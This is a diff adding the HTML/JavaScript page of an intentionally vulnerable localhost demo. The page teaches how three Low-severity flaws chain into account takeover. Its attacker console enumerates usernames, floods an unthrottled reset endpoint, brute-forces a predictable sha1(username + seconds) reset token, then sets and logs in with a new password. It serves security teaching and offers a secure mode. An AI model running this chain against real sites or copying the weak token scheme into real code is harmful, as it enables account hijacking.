@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Chained Attack Demo — Security Education</title>
+<style>
+  :root {
+    --bg: #0f1420;
+    --panel: #171d2b;
+    --panel-2: #1e2637;
+    --border: #2c3547;
+    --text: #e6ebf2;
+    --muted: #8b97ab;
+    --accent: #4c8dff;
+    --low: #e9b949;
+    --low-bg: #3a3010;
+    --crit: #ff4d4f;
+    --crit-bg: #3a1214;
+    --ok: #34c759;
+    --mono: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+    background: var(--bg); color: var(--text);
+  }
+  #banner {
+    background: repeating-linear-gradient(45deg, #7a1417, #7a1417 12px, #611013 12px, #611013 24px);
+    color: #fff; text-align: center; font-weight: 700; padding: 8px 12px; letter-spacing: .3px;
+    font-size: 13px; position: sticky; top: 0; z-index: 10;
+    border-bottom: 1px solid #a3282b;
+  }
+  header.title { padding: 16px 20px 4px; }
+  header.title h1 { margin: 0; font-size: 20px; }
+  header.title p { margin: 4px 0 0; color: var(--muted); font-size: 13px; }
+  #mode-tag { font-family: var(--mono); font-size: 12px; padding: 2px 8px; border-radius: 20px; border: 1px solid var(--border); }
+  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; padding: 16px 20px; }
+  @media (max-width: 900px) { .grid { grid-template-columns: 1fr; } }
+  .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
+  .panel > h2 { margin: 0; padding: 12px 16px; font-size: 15px; border-bottom: 1px solid var(--border); background: var(--panel-2); }
+  .panel .body { padding: 16px; }
+  label { display: block; font-size: 12px; color: var(--muted); margin: 10px 0 4px; }
+  input {
+    width: 100%; padding: 9px 10px; background: #0c111b; border: 1px solid var(--border);
+    color: var(--text); border-radius: 8px; font-size: 14px; font-family: inherit;
+  }
+  button {
+    cursor: pointer; border: none; border-radius: 8px; padding: 9px 14px; font-size: 13px;
+    font-weight: 600; color: #fff; background: var(--accent); margin-top: 10px;
+  }
+  button.secondary { background: #33405a; }
+  button.attack { background: #b3402f; width: 100%; text-align: left; display: flex; justify-content: space-between; align-items: center; }
+  button.attack .n { background: rgba(0,0,0,.25); border-radius: 6px; padding: 2px 8px; font-family: var(--mono); }
+  button:disabled { opacity: .45; cursor: not-allowed; }
+  .app-msg { margin-top: 12px; font-size: 13px; padding: 10px; border-radius: 8px; min-height: 18px; background: #0c111b; border: 1px solid var(--border); }
+  .step { border: 1px solid var(--border); border-radius: 10px; padding: 12px; margin-bottom: 12px; background: var(--panel-2); }
+  .step p { margin: 6px 0 0; font-size: 12px; color: var(--muted); }
+  .step .result { margin-top: 8px; font-size: 12px; font-family: var(--mono); white-space: pre-wrap; color: #cdd7e6; display: none; }
+  .step.done { border-color: var(--ok); }
+  .badge { font-size: 11px; padding: 2px 8px; border-radius: 20px; font-weight: 700; }
+  .badge.low { background: var(--low-bg); color: var(--low); border: 1px solid var(--low); }
+  .badge.pending { background: #232a3a; color: var(--muted); border: 1px solid var(--border); }
+  .badge.done { background: #12331d; color: var(--ok); border: 1px solid var(--ok); }
+
+  /* Severity meter */
+  #severity { padding: 14px 16px; border-radius: 12px; border: 1px solid var(--border); margin: 0 20px 8px; background: var(--panel); }
+  #severity .track { display: flex; gap: 8px; margin: 10px 0; }
+  #severity .cell { flex: 1; text-align: center; padding: 10px 6px; border-radius: 8px; font-weight: 700; font-size: 13px;
+    background: #232a3a; color: var(--muted); border: 1px solid var(--border); transition: all .25s; }
+  #severity .cell.low { background: var(--low-bg); color: var(--low); border-color: var(--low); }
+  #severity .verdict { font-size: 15px; font-weight: 800; padding: 10px 12px; border-radius: 8px; text-align: center;
+    background: #232a3a; color: var(--muted); border: 1px solid var(--border); }
+  #severity.critical .verdict { background: var(--crit-bg); color: var(--crit); border-color: var(--crit); animation: pulse 1s ease-in-out 2; }
+  #severity .why { font-size: 12px; color: var(--muted); margin-top: 8px; text-align: center; }
+  @keyframes pulse { 50% { box-shadow: 0 0 0 4px rgba(255,77,79,.25); } }
+
+  /* HTTP console */
+  #console { margin: 0 20px 24px; }
+  #console h2 { font-size: 14px; margin: 0 0 6px; }
+  #log {
+    background: #080b12; border: 1px solid var(--border); border-radius: 10px; padding: 12px;
+    font-family: var(--mono); font-size: 12px; height: 260px; overflow-y: auto; white-space: pre-wrap;
+  }
+  .log-req { color: #7fd1ff; }
+  .log-res-ok { color: #6ee7a0; }
+  .log-res-err { color: #ff8a8a; }
+  .log-note { color: var(--low); }
+  a { color: var(--accent); }
+</style>
+</head>
+<body>
+<div id="banner">⚠ INTENTIONALLY VULNERABLE — FOR SECURITY EDUCATION ONLY. DO NOT DEPLOY. Runs on 127.0.0.1 with fake seeded data only. ⚠</div>
+
+<header class="title">
+  <h1>Vulnerability Chaining Demo — Account Takeover</h1>
+  <p>Three <b>Low</b>-severity weaknesses that combine into a <b>Critical</b> exploit. Current mode:
+     <span id="mode-tag">…</span></p>
+</header>
+
+<!-- SEVERITY METER -->
+<div id="severity">
+  <div style="display:flex;justify-content:space-between;align-items:center">
+    <b>Severity meter</b>
+    <span id="sev-count" style="font-size:12px;color:var(--muted)">0 / 3 links completed</span>
+  </div>
+  <div class="track">
+    <div class="cell" id="cell1">1 · Enumeration<br><small>Low</small></div>
+    <div class="cell" id="cell2">2 · No rate limit<br><small>Low</small></div>
+    <div class="cell" id="cell3">3 · Predictable token<br><small>Low</small></div>
+  </div>
+  <div class="verdict" id="verdict">No chain completed — individual risk only</div>
+  <div class="why" id="why">Each weakness alone is Low. Complete all three attacker steps to see what happens when they combine.</div>
+</div>
+
+<div class="grid">
+  <!-- LEFT: THE APPLICATION -->
+  <section class="panel">
+    <h2>🖥️ The Application <span style="color:var(--muted);font-weight:400">— a normal login &amp; reset flow</span></h2>
+    <div class="body">
+      <b style="font-size:13px">Sign in</b>
+      <label>Username</label>
+      <input id="app-user" value="alice" />
+      <label>Password</label>
+      <input id="app-pass" type="password" placeholder="password" />
+      <button id="app-login">Log in</button>
+
+      <hr style="border-color:var(--border);margin:18px 0" />
+
+      <b style="font-size:13px">Forgot your password?</b>
+      <label>Username</label>
+      <input id="app-reset-user" value="alice" />
+      <button id="app-reset" class="secondary">Send reset link</button>
+
+      <div class="app-msg" id="app-msg">Try logging in, or request a password reset. This panel behaves like an ordinary web app.</div>
+    </div>
+  </section>
+
+  <!-- RIGHT: ATTACKER CONSOLE -->
+  <section class="panel">
+    <h2>🕵️ Attacker Console <span style="color:var(--muted);font-weight:400">— runs the chain live</span></h2>
+    <div class="body">
+
+      <div class="step" id="step1">
+        <div style="display:flex;justify-content:space-between;align-items:center">
+          <b style="font-size:13px">Step 1 — Enumerate users</b>
+          <span class="badge low" id="b1">LOW</span>
+        </div>
+        <p>Probe the login endpoint with a bogus password to see how it responds for a real vs. fake username. The wording &amp; timing differ — that difference confirms which accounts exist.</p>
+        <button class="attack" id="atk1">Enumerate <code>alice</code> vs <code>ghost</code><span class="n">▶</span></button>
+        <div class="result" id="r1"></div>
+      </div>
+
+      <div class="step" id="step2">
+        <div style="display:flex;justify-content:space-between;align-items:center">
+          <b style="font-size:13px">Step 2 — Spam the reset endpoint</b>
+          <span class="badge pending" id="b2">LOW</span>
+        </div>
+        <p>Fire many password-reset requests for <code>alice</code> back-to-back. With no rate limiting, none are blocked — and we get to pick the exact instant a token is minted.</p>
+        <button class="attack" id="atk2" disabled>Fire 8 reset requests <span class="n">▶</span></button>
+        <div class="result" id="r2"></div>
+      </div>
+
+      <div class="step" id="step3">
+        <div style="display:flex;justify-content:space-between;align-items:center">
+          <b style="font-size:13px">Step 3 — Predict token &amp; take over</b>
+          <span class="badge pending" id="b3">LOW</span>
+        </div>
+        <p>Trigger one reset at a known instant, reconstruct the predictable token <code>sha1(username + unixSeconds)</code> offline, reset alice's password, and log in as her.</p>
+        <button class="attack" id="atk3" disabled>Reconstruct token &amp; hijack <code>alice</code> <span class="n">▶</span></button>
+        <div class="result" id="r3"></div>
+      </div>
+
+      <button class="secondary" id="reset-demo" style="width:100%">↺ Reset demo state</button>
+    </div>
+  </section>
+</div>
+
+<!-- HTTP CONSOLE -->
+<div id="console">
+  <h2>📡 HTTP console <span style="color:var(--muted);font-weight:400;font-size:12px">— every underlying request &amp; response</span></h2>
+  <div id="log"></div>
+</div>
+
+<script>
+const $ = (id) => document.getElementById(id);
+const logEl = $("log");
+let completed = { 1: false, 2: false, 3: false };
+
+function log(cls, text) {
+  const span = document.createElement("div");
+  span.className = cls;
+  span.textContent = text;
+  logEl.appendChild(span);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+function logSep() { const d = document.createElement("div"); d.style.borderTop = "1px dashed #2c3547"; d.style.margin = "6px 0"; logEl.appendChild(d); }
+
+// Wrapper that logs request + response to the HTTP console.
+async function apiCall(method, path, body) {
+  log("log-req", `→ ${method} ${path}` + (body ? `  ${JSON.stringify(body)}` : ""));
+  const t0 = performance.now();
+  const res = await fetch(path, {
+    method,
+    headers: { "Content-Type": "application/json" },
+    body: body ? JSON.stringify(body) : undefined,
+  });
+  const ms = Math.round(performance.now() - t0);
+  const json = await res.json().catch(() => ({}));
+  const cls = res.ok ? "log-res-ok" : "log-res-err";
+  log(cls, `← ${res.status} ${res.statusText} (${ms}ms)  ${JSON.stringify(json)}`);
+  return { status: res.status, ok: res.ok, ms, json };
+}
+
+// SHA-1 in the browser — the attacker replicating VULN 3's weak algorithm.
+async function sha1Hex(str) {
+  const buf = await crypto.subtle.digest("SHA-1", new TextEncoder().encode(str));
+  return [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, "0")).join("");
+}
+
+function setBadge(id, state, text) {
+  const el = $(id);
+  el.className = "badge " + state;
+  el.textContent = text;
+}
+
+function refreshSeverity() {
+  const n = Object.values(completed).filter(Boolean).length;
+  $("sev-count").textContent = `${n} / 3 links completed`;
+  [1, 2, 3].forEach((i) => $("cell" + i).classList.toggle("low", completed[i]));
+  const sev = $("severity");
+  if (n === 3) {
+    sev.classList.add("critical");
+    $("verdict").textContent = "🔴 CRITICAL — FULL ACCOUNT TAKEOVER";
+    $("why").innerHTML = "Enumeration named the target, the unthrottled endpoint let the attacker mint a token at a chosen instant, and the predictable algorithm let them regenerate it — three Lows became a Critical.";
+  } else {
+    sev.classList.remove("critical");
+    $("verdict").textContent = n === 0
+      ? "No chain completed — individual risk only"
+      : `${n} of 3 links done — still only Low individually`;
+    $("why").textContent = "Each weakness alone is Low. Complete all three attacker steps to see what happens when they combine.";
+  }
+}
+
+// ---- The Application (left panel) ----
+$("app-login").onclick = async () => {
+  const r = await apiCall("POST", "/api/login", { username: $("app-user").value, password: $("app-pass").value });
+  $("app-msg").textContent = r.json.message || "";
+  $("app-msg").style.color = r.ok ? "var(--ok)" : "var(--crit)";
+};
+$("app-reset").onclick = async () => {
+  const r = await apiCall("POST", "/api/reset/request", { username: $("app-reset-user").value });
+  $("app-msg").textContent = r.json.message || "";
+  $("app-msg").style.color = "var(--muted)";
+};
+
+// ---- Step 1: enumerate ----
+$("atk1").onclick = async () => {
+  logSep(); log("log-note", "// STEP 1 — username enumeration");
+  const real = await apiCall("POST", "/api/login", { username: "alice", password: "x" });
+  const fake = await apiCall("POST", "/api/login", { username: "ghost", password: "x" });
+  const different = real.status !== fake.status || real.json.message !== fake.json.message;
+  $("r1").style.display = "block";
+  $("r1").textContent =
+    `alice → ${real.status}: "${real.json.message}" (${real.ms}ms)\n` +
+    `ghost → ${fake.status}: "${fake.json.message}" (${fake.ms}ms)\n` +
+    (different
+      ? `➜ Responses DIFFER — "alice" is a confirmed real account. Target acquired.`
+      : `➜ Responses are identical — endpoint does not leak account existence (SECURE_MODE).`);
+  if (different) {
+    completed[1] = true; setBadge("b1", "done", "DONE");
+    $("step1").classList.add("done"); $("atk2").disabled = false;
+  } else {
+    log("log-note", "// enumeration failed — server is in SECURE_MODE");
+  }
+  refreshSeverity();
+};
+
+// ---- Step 2: spam reset (no rate limit) ----
+$("atk2").onclick = async () => {
+  logSep(); log("log-note", "// STEP 2 — hammering /api/reset/request (no throttle expected)");
+  let blocked = 0, ok = 0;
+  for (let i = 0; i < 8; i++) {
+    const r = await apiCall("POST", "/api/reset/request", { username: "alice" });
+    if (r.status === 429 || r.json.blocked) blocked++; else ok++;
+  }
+  $("r2").style.display = "block";
+  $("r2").textContent =
+    `8 requests sent → ${ok} accepted, ${blocked} blocked.\n` +
+    (blocked === 0
+      ? `➜ Zero blocked. No rate limit — attacker can mint tokens at will.`
+      : `➜ ${blocked} blocked — throttling is active (SECURE_MODE).`);
+  if (blocked === 0) {
+    completed[2] = true; setBadge("b2", "done", "DONE");
+    $("step2").classList.add("done"); $("atk3").disabled = false;
+  } else {
+    log("log-note", "// rate limiting kicked in — server is in SECURE_MODE");
+  }
+  refreshSeverity();
+};
+
+// ---- Step 3: predict token & take over ----
+$("atk3").onclick = async () => {
+  logSep(); log("log-note", "// STEP 3 — trigger reset, reconstruct token, hijack account");
+  const username = "alice";
+  const newPassword = "pwned-by-attacker";
+
+  // Fire the reset at an instant we record precisely.
+  const tBefore = Date.now();
+  await apiCall("POST", "/api/reset/request", { username });
+  const tAfter = Date.now();
+
+  // The server used sha1(username + floor(Date.now()/1000)). We don't know the
+  // exact second, so we brute a tiny window around when we fired the request.
+  const from = Math.floor((tBefore - 2000) / 1000);
+  const to = Math.floor((tAfter + 2000) / 1000);
+  log("log-note", `// reconstructing sha1("${username}"+sec) for sec in [${from}..${to}]`);
+
+  let success = false, usedSec = null, token = null;
+  for (let sec = from; sec <= to && !success; sec++) {
+    const candidate = await sha1Hex(username + sec);
+    const r = await apiCall("POST", "/api/reset/confirm", { username, token: candidate, newPassword });
+    if (r.ok) { success = true; usedSec = sec; token = candidate; }
+  }
+
+  $("r3").style.display = "block";
+  if (!success) {
+    $("r3").textContent =
+      "➜ Could not reconstruct the token. Token is not predictable (SECURE_MODE) —\n" +
+      "the random token cannot be regenerated from username + time.";
+    log("log-note", "// takeover FAILED — token is cryptographically random (SECURE_MODE)");
+    refreshSeverity();
+    return;
+  }
+
+  log("log-note", `// token matched at second=${usedSec}: ${token}`);
+  // Log in as the victim with the password WE just set.
+  const login = await apiCall("POST", "/api/login", { username, password: newPassword });
+  $("r3").textContent =
+    `➜ Token reconstructed: ${token}\n` +
+    `➜ alice's password reset to "${newPassword}"\n` +
+    (login.ok ? `➜ Logged in as alice: ${login.json.session}\n🔴 ACCOUNT TAKEOVER COMPLETE` : `➜ Login failed unexpectedly.`);
+
+  if (login.ok) {
+    completed[3] = true; setBadge("b3", "done", "DONE");
+    $("step3").classList.add("done");
+  }
+  refreshSeverity();
+};
+
+// ---- Reset demo state (client-side only; server state resets on restart) ----
+$("reset-demo").onclick = () => {
+  completed = { 1: false, 2: false, 3: false };
+  [1, 2, 3].forEach((i) => {
+    $("r" + i).style.display = "none";
+    $("step" + i).classList.remove("done");
+  });
+  setBadge("b1", "low", "LOW"); setBadge("b2", "pending", "LOW"); setBadge("b3", "pending", "LOW");
+  $("atk2").disabled = true; $("atk3").disabled = true;
+  logEl.innerHTML = "";
+  refreshSeverity();
+  log("log-note", "// demo reset. Note: victim passwords persist until the SERVER restarts.");
+};
+
+// ---- Init ----
+(async () => {
+  try {
+    const m = await (await fetch("/api/mode")).json();
+    $("mode-tag").textContent = m.secureMode ? "SECURE_MODE — fixes applied" : "VULNERABLE — chain works";
+    $("mode-tag").style.color = m.secureMode ? "var(--ok)" : "var(--low)";
+  } catch { $("mode-tag").textContent = "unknown"; }
+  refreshSeverity();
+  log("log-note", "// HTTP console ready. Run steps 1 → 2 → 3 on the right.");
+})();
+</script>
+</body>
+</html>
